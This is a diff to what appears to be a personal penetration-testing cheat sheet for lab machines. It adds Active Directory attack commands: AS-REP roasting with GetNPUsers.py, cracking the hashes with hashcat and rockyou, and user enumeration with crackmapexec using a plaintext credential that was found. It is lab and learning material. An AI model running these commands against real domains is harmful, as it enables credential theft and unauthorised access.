@@ -58,8 +58,14 @@ After the first foothold, remember to enumerate internal networking. This can le
 - If found any hashes with `responder` or other methods, crack them with `hashcat` or perform Relay Attack
 
 ```bash
-#try to get uid with a user list
+#if pre-auth disabled, try to get uid with a user list, it will return hash, then crack with hashcat
 python3 GetNPUsers.py abc.com/ -no-pass -usersfile userslist.txt -dc-ip 10.10.10.175
+
+#Hashcat
+hashcat -m 18200 hacker.txt /usr/share/wordlists/rockyou.txt --force
+
+#Get all users with found id pw.
+crackmapexec smb 10.10.10.175 -u fsmith -p  Thestrokes23 --users
 ```
 
 # SNMP port 161
